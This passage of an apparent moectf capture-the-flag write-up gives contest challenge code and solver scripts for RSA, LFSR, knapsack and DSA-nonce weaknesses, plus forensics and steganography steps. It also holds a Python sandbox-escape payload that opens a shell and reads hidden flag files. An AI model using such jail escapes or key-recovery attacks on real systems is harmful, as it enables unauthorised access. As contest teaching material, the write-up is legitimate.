style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8141079999999999em;vertical-align:0em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span><span class="mord mtight">.</span><span class="mord mtight">2</span><span class="mord mtight">9</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><br /><code>Boneh Durfee Attack</code><br /><a href="https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage">https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.sage</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">N,e = (<span class="number">134133840507194879124722303971806829214527933948661780641814514330769296658351734941972795427559665538634298343171712895678689928571804399278111582425131730887340959438180029645070353394212857682708370490223871309129948337487286534021548834043845658248447393803949524601871557448883163646364233913283438778267</span>, <span class="number">83710839781828547042000099822479827455150839630087752081720660846682103437904198705287610613170124755238284685618099812447852915349294538670732128599161636818193216409714024856708796982283165572768164303554014943361769803463110874733906162673305654979036416246224609509772196787570627778347908006266889151871</span>)</span><br><span class="line">ciphertext = <span class="number">73228838248853753695300650089851103866994923279710500065528688046732360241259421633583786512765328703209553157156700672911490451923782130514110796280837233714066799071157393374064802513078944766577262159955593050786044845920732282816349811296561340376541162788570190578690333343882441362690328344037119622750</span></span><br><span class="line">d = <span class="number">420129172617694367639603712165881242192973923283572937883375494685279140840871</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(ciphertext,d,N))).decode())</span><br></pre></td></tr></table></figure><h2 id="ezmatrix"><a class="markdownIt-Anchor" href="#ezmatrix"></a> EzMatrix()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG,secrets,SECERT_T</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(secrets) == <span class="number">16</span></span><br><span class="line"><span class="keyword">assert</span> FLAG == <span class="string">b&#x27;moectf&#123;&#x27;</span> + secrets + <span class="string">b&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(SECERT_T) &lt;= <span class="number">127</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LFSR</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self._s = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">list</span>(<span class="string">&quot;&#123;:0128b&#125;&quot;</span>.<span class="built_in">format</span>(bytes_to_long(secrets)))))</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>*<span class="built_in">len</span>(secrets)):</span><br><span class="line">            self.clock()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">clock</span>(<span class="params">self</span>):</span><br><span class="line">        b = self._s[<span class="number">0</span>]</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> SECERT_T:c ^= self._s[t]</span><br><span class="line">        self._s = self._s[<span class="number">1</span>:] + [c]</span><br><span class="line">        <span class="keyword">return</span> b</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">stream</span>(<span class="params">self, length</span>):</span><br><span class="line">        <span class="keyword">return</span> [self.clock() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length)]</span><br><span class="line"></span><br><span class="line">c = LFSR()</span><br><span class="line">stream = c.stream(<span class="number">256</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,stream))[:-<span class="number">5</span>])</span><br><span class="line"><span class="comment"># 11111110011011010000110110100011110110110101111000101011001010110011110011000011110001101011001100000011011101110000111001100111011100010111001100111101010011000110110101011101100001010101011011101000110001111110100000011110010011010010100100000000110</span></span><br></pre></td></tr></table></figure><p><code>LFSR</code></p><h2 id="ezpack"><a class="markdownIt-Anchor" href="#ezpack"></a> EzPack</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">p = <span class="number">2050446265000552948792079248541986570794560388346670845037360320379574792744856498763181701382659864976718683844252858211123523214530581897113968018397826268834076569364339813627884756499465068203125112750486486807221544715872861263738186430034771887175398652172387692870928081940083735448965507812844169983643977</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) == <span class="number">42</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">msg</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bin</span>(bytes_to_long(msg))[<span class="number">2</span>:].zfill(<span class="number">8</span>*<span class="built_in">len</span>(msg))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genkey</span>(<span class="params"><span class="built_in">len</span></span>):</span><br><span class="line">    sums = <span class="number">0</span></span><br><span class="line">    keys = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>):</span><br><span class="line">        k = random.randint(<span class="number">1</span>,<span class="number">7777</span>)</span><br><span class="line">        x = sums + k</span><br><span class="line">        keys.append(x)</span><br><span class="line">        sums += x</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line">key = genkey(<span class="number">42</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, keys</span>):</span><br><span class="line">    msg = encode(m)</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(keys))</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(msg))</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(msg) == <span class="built_in">len</span>(keys)</span><br><span class="line">    s = <span class="built_in">sum</span>((k <span class="keyword">if</span> (<span class="built_in">int</span>(p,<span class="number">2</span>) == <span class="number">1</span>) <span class="keyword">else</span> <span class="number">1</span>) <span class="keyword">for</span> p, k <span class="keyword">in</span> <span class="built_in">zip</span>(msg, keys))</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">for</span> p0,k <span class="keyword">in</span> <span class="built_in">zip</span>(msg,keys):</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">int</span>(p0,<span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(<span class="number">7</span>,s,p)</span><br><span class="line"></span><br><span class="line">cipher = enc(flag,key)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> fs:</span><br><span class="line">    fs.write(<span class="built_in">str</span>(key)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    fs.write(<span class="built_in">str</span>(cipher))</span><br></pre></td></tr></table></figure><p><code>DLP</code>+<code></code></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c = <span class="number">1210552586072154479867426776758107463169244511186991628141504400199024936339296845132507655589933479768044598418932176690108379140298480790405551573061005655909291462247675584868840035141893556748770266337895571889128422577613223452797329555381197215533551339146807187891070847348454214231505098834813871022509186</span></span><br><span class="line">key = [...]</span><br><span class="line">p = <span class="number">2050446265000552948792079248541986570794560388346670845037360320379574792744856498763181701382659864976718683844252858211123523214530581897113968018397826268834076569364339813627884756499465068203125112750486486807221544715872861263738186430034771887175398652172387692870928081940083735448965507812844169983643977</span></span><br><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="comment"># R = GF(p)</span></span><br><span class="line"><span class="comment"># s = R(c).log(R(7))</span></span><br><span class="line">s = <span class="number">363965742933281351259442199216117822475210003294088371760914916341815880641228470807683148775152284520244</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key[::-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> i &lt;= s:</span><br><span class="line">        flag += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        s -= i</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        s -= <span class="number">1</span></span><br><span class="line">flag = flag[::-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">8</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">int</span>(flag[i:i+<span class="number">8</span>], <span class="number">2</span>)), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="ezlcg"><a class="markdownIt-Anchor" href="#ezlcg"></a> ezLCG()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits, randint</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> randbelow</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,isPrime,inverse</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> priKey, flag</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">q = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    t0 = q*getrandbits(<span class="number">864</span>)</span><br><span class="line">    <span class="keyword">if</span> isPrime(t0+<span class="number">1</span>):</span><br><span class="line">        p = t0 + <span class="number">1</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">x = priKey</span><br><span class="line"><span class="keyword">assert</span> p % q == <span class="number">1</span></span><br><span class="line">h = randint(<span class="number">1</span>,p-<span class="number">1</span>)</span><br><span class="line">g = <span class="built_in">pow</span>(h,(p-<span class="number">1</span>)//q,p)</span><br><span class="line">y = <span class="built_in">pow</span>(g,x,p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">z, k</span>):</span><br><span class="line">    r = <span class="built_in">pow</span>(g,k,p) % q</span><br><span class="line">    s = (inverse(k,q)*(z+r*priKey)) % q</span><br><span class="line">    <span class="keyword">return</span> (r,s)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">m,s,r</span>):</span><br><span class="line">    z = <span class="built_in">int</span>.from_bytes(sha1(m).digest(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    u1 = (inverse(s,q)*z) % q</span><br><span class="line">    u2 = (inverse(s,q)*r) % q</span><br><span class="line">    r0 = ((<span class="built_in">pow</span>(g,u1,p)*<span class="built_in">pow</span>(y,u2,p)) % p) % q</span><br><span class="line">    <span class="keyword">return</span> r0 == r</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcg</span>(<span class="params">a, b, q, x</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x = (a * x + b) % q</span><br><span class="line">        <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line">msg = [os.urandom(<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">a, b, x = [randbelow(q) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>)]</span><br><span class="line">prng = lcg(a, b, q, x)</span><br><span class="line">sigs = []</span><br><span class="line"><span class="keyword">for</span> m, k <span class="keyword">in</span> <span class="built_in">zip</span>(msg,prng):</span><br><span class="line">    z = <span class="built_in">int</span>.from_bytes(sha1(m).digest(), <span class="string">&quot;big&quot;</span>) % q</span><br><span class="line">    r, s = sign(z, k)</span><br><span class="line">    <span class="keyword">assert</span> verify(m, s, r)</span><br><span class="line">    sigs.append((r,s))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;g = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;h = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;q = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;p = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;msg = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;sigs = &#125;</span>&quot;</span>)</span><br><span class="line">key = sha1(<span class="built_in">str</span>(priKey).encode()).digest()[:<span class="number">16</span>]</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">cipher = AES.new(key, AES.MODE_CBC,iv)</span><br><span class="line">ct = cipher.encrypt(pad(flag,<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;iv = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">g = 81569684196645348869992756399797937971436996812346070571468655785762437078898141875334855024163673443340626854915520114728947696423441493858938345078236621180324085934092037313264170158390556505922997447268262289413542862021771393535087410035145796654466502374252061871227164352744675750669230756678480403551</span></span><br><span class="line"><span class="string">h = 13360659280755238232904342818943446234394025788199830559222919690197648501739683227053179022521444870802363019867146013415532648906174842607370958566866152133141600828695657346665923432059572078189013989803088047702130843109809724983853650634669946823993666248096402349533564966478014376877154404963309438891</span></span><br><span class="line"><span class="string">q = 1303803697251710037027345981217373884089065173721</span></span><br><span class="line"><span class="string">p = 135386571420682237420633670579115261427110680959831458510661651985522155814624783887385220768310381778722922186771694358185961218902544998325115481951071052630790578356532158887162956411742570802131927372034113509208643043526086803989709252621829703679985669846412125110620244866047891680775125948940542426381</span></span><br><span class="line"><span class="string">msg = [b&#x27;I\xf0\xccy\xd5~\xed\xf8A\xe4\xdf\x91+\xd4_$&#x27;, b&#x27;~\xa0\x9bCB\xef\xc3SY4W\xf9Aa\rO&#x27;, b&#x27;\xe6\x96\xf4\xac\n9\xa7\xc4\xef\x82S\xe9 XpJ&#x27;, b&#x27;3,\xbb\xe2-\xcc\xa1o\xe6\x93+\xe8\xea=\x17\xd1&#x27;, b&#x27;\x8c\x19PHN\xa8\xbc\xfc\xa20r\xe5\x0bMwJ&#x27;]</span></span><br><span class="line"><span class="string">sigs = [(913082810060387697659458045074628688804323008021, 601727298768376770098471394299356176250915124698), (406607720394287512952923256499351875907319590223, 946312910102100744958283218486828279657252761118), (1053968308548067185640057861411672512429603583019, 1284314986796793233060997182105901455285337520635), (878633001726272206179866067197006713383715110096, 1117986485818472813081237963762660460310066865326), (144589405182012718667990046652227725217611617110, 1028458755419859011294952635587376476938670485840)]</span></span><br><span class="line"><span class="string">iv = b&#x27;M\xdf\x0e\x7f\xeaj\x17PE\x97\x8e\xee\xaf:\xa0\xc7&#x27;</span></span><br><span class="line"><span class="string">ct = b&quot;\xa8a\xff\xf1[(\x7f\xf9\x93\xeb0J\xc43\x99\xb25:\xf5&gt;\x1c?\xbd\x8a\xcd)i)\xdd\x87l1\xf5L\xc5\xc5&#x27;N\x18\x8d\xa5\x9e\x84\xfe\x80\x9dm\xcc&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="babe-lifting"><a class="markdownIt-Anchor" href="#babe-lifting"></a> babe-Lifting</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">0x1001</span></span><br><span class="line">d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">bit_leak = <span class="number">400</span></span><br><span class="line">d_leak = d &amp; ((<span class="number">1</span>&lt;&lt;bit_leak)-<span class="number">1</span>)</span><br><span class="line">msg = bytes_to_long(flag)</span><br><span class="line">cipher = <span class="built_in">pow</span>(msg,e,n)</span><br><span class="line">pk = (n, e)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;pk = <span class="subst">&#123;pk&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;cipher = <span class="subst">&#123;cipher&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;hint = <span class="subst">&#123;d_leak&#125;</span>\n&quot;</span>)</span><br><span class="line">    f.close()</span><br><span class="line">pk = (<span class="number">53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123</span>, <span class="number">4097</span>)</span><br><span class="line">cipher = <span class="number">14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054</span></span><br><span class="line">hint = <span class="number">1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129</span></span><br></pre></td></tr></table></figure><p><code>d_leak = d &amp; ((1&lt;&lt;bit_leak)-1)</code><code>d</code>400<br /><a href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/">https://lazzzaro.github.io/2020/05/06/crypto-RSA/</a> <code>La</code>10QWQ<br /></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">partial_p</span>(<span class="params">p0, kbits, n</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.4</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p <span class="keyword">and</span> p != <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n, e = (<span class="number">53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123</span>, <span class="number">4097</span>)</span><br><span class="line">    c = <span class="number">14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054</span></span><br><span class="line">    d0 = <span class="number">1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129</span></span><br><span class="line">    beta = <span class="number">0.5</span></span><br><span class="line">    nbits = n.nbits()</span><br><span class="line">    kbits = d0.nbits()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;lower %d bits (of %d bits) is given&quot;</span> % (kbits, nbits))</span><br><span class="line">    p = <span class="built_in">int</span>(find_p(d0, kbits, e, n))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;found p: %d&quot;</span> % p)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;not found!&quot;</span>)</span><br><span class="line">    q = n//<span class="built_in">int</span>(p)</span><br><span class="line">    d = inverse(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">pow</span>(c,d,n))).decode())</span><br></pre></td></tr></table></figure><p><a href="https://www.ams.org/notices/199902/boneh.pdf">https://www.ams.org/notices/199902/boneh.pdf</a></p><h2 id="hidden-poly"><a class="markdownIt-Anchor" href="#hidden-poly"></a> hidden-poly()</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">q = <span class="number">264273181570520944116363476632762225021</span></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">root = <span class="number">122536272320154909907460423807891938232</span></span><br><span class="line">f = <span class="built_in">sum</span>([a*root**i <span class="keyword">for</span> i,a <span class="keyword">in</span> <span class="built_in">enumerate</span>(key)])</span><br><span class="line"><span class="keyword">assert</span> key.isascii()</span><br><span class="line"><span class="keyword">assert</span> f % q == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    flag = f.read()</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key,AES.MODE_CBC, iv)</span><br><span class="line">ciphertext = cipher.encrypt(pad(flag,<span class="number">16</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;iv = &#125;</span>&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">    f.write(<span class="string">f&quot;<span class="subst">&#123;ciphertext = &#125;</span>&quot;</span> + <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">iv = <span class="string">b&#x27;Gc\xf2\xfd\x94\xdc\xc8\xbb\xf4\x84\xb1\xfd\x96\xcd6\\&#x27;</span></span><br><span class="line">ciphertext = <span class="string">&#x27;d23eac665cdb57a8ae7764bb4497eb2f79729537e596600ded7a068c407e67ea75e6d76eb9e23e21634b84a96424130e&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h1><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>gif</code><code>ToolsFx</code></p><h2 id=""><a class="markdownIt-Anchor" href="#"></a> </h2><p><code>.... ....- ...- . ..--.- .- ..--.- --. ----- ----- -.. ..--.- - .---- -- .</code></p><h2 id="ez_forensics"><a class="markdownIt-Anchor" href="#ez_forensics"></a> ez_Forensics</h2><p><code>cmdscan</code><br /><code>vol.py -f flag.raw --profile=Win7SP1x64 cmdscan</code></p><h2 id="so-many-m"><a class="markdownIt-Anchor" href="#so-many-m"></a> so many m</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a!&#123;ivlotzkEm&#123;CtsvEpbDkwexsotyMuECs!mvlhmenrhwpMh0leydsMbC#CC&#125;sii&#125;tkb&#125;ugCD&#123;zlEeT#kyC0fbukglpopmaekbEthmjcMdsgkvmTnC&#125;eot#dcf&#123;ec@ccgqpfqMycysMuuou!en#&#123;g0cDmoyxTCMgt&#123;joT&#123;jnl0rhoklCe&#123;n0CnxprydeaTg0r&#123;avkEjckjEsxhaohs&#123;Trbkr!ffqip444uwrc&#125;nnevgtCT&#123;jCipogtipzdeDiqsy44rMfj&#123;MzCw#qwg&#123;T4m&#123;cuk!hwuncxdmddeurtsojakrjC#vTDd&#125;0poTT@c!DftjwuDp@mcuheeDtfao!iEcEq&#125;kcf#Mpcam&#123;mml4i4mpDnedamcwtC0nem&#123;mDotnmp4jf@TpxfqMoiqwtdijDfimmCzmxe#gsTu&#123;poeTEhD!u0anvTTTbbi&#123;q&#125;zapcksMifDlovoeac@&#123;0keh0dg&#123;Mi!@tfftqitmuMoMcuTpmcgnmozyrrv#zfmzmetyxxa0wczE&#125;eoD&#123;xcMnoCuebu0otdusiDknfvo0&#123;fEsMftzT!eoslegbypspC4vkxm#uaf@acuemhMyiDou#at0rfl4a&#125;0ixeEktws&#125;pMCfCigaTafg&#125;ffssmwwuTkTuls0&#123;M@c4e@&#123;D&#123;tuorzmyqptChpngkeCohCCMTwqctinc0mcjemclv@cMoqf00poarte@oqmuysm#mo&#123;et4kcCpcgcT&#125;vD&#125;m!g4&#123;E0!Mol0fpo!&#123;srT0pf&#123;cMuCx0bp&#123;ftTmExcrn&#125;0etonez!@C4tfa4aM00siztb@fomfD#&#123;#tMbo@jgb4CM0dEk0tea4aMCafn</span><br></pre></td></tr></table></figure><p><code>many</code><br /><code>moectf&#123;C0pMuTaskingD4rE&#125;!vlzbwxyhd#j@q</code><br /><br /><code>moectf&#123;C0MpuTaskingD4rE&#125;</code><br /><code>flag</code></p><h2 id="abnormal-lag"><a class="markdownIt-Anchor" href="#abnormal-lag"></a> Abnormal lag</h2><p><br /><code>Audacity</code><br /><code>moectf&#123;09e3f7f8-c970-4c71-92b0-6f03a677421a&#125;</code></p><h2 id="ez_f5"><a class="markdownIt-Anchor" href="#ez_f5"></a> ez_F5</h2><p><code>F5</code><br /><code>java Extract suantouwangba.jpg -p no_password</code></p><h2 id="moejail_lv1"><a class="markdownIt-Anchor" href="#moejail_lv1"></a> moejail_lv1</h2><p><code>help()</code><code>!sh</code><br /><code>base</code><code>popen</code><code>flag</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;</span>.__class__.__mro__[-1].__subclasses__()[155].__init__.__globals__[<span class="string">&#x27;system&#x27;</span>](<span class="string">&#x27;sh&#x27;</span>)</span><br><span class="line">find / -name <span class="string">&quot;*flag*&quot;</span></span><br><span class="line"></span><br><span class="line">/tmp/.therealflag_7930f4a214d11cc8e1fe3d2691e18ae167f16d8abb646cc880b8ddd79b1de22938e2162129ab7f04cb93c8b77ce0d2eda3ca6ca7dec2ddfdc3bc3bbd6a23a50d  -</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /tmp/.*</span><br></pre></td></tr></table></figure><h2 id="the-upside-and-down"><a class="markdownIt-Anchor" href="#the-upside-and-down"></a> The upside and down</h2><p><code>010</code>16<code>png</code><br /><br /><img src="https://picx.zhimg.com/80/v2-39b6b2efa4c1ac96de78bb3aef115bbb_1440w.png" alt="" /><br /></p><h2 id="ctfer20771"><a 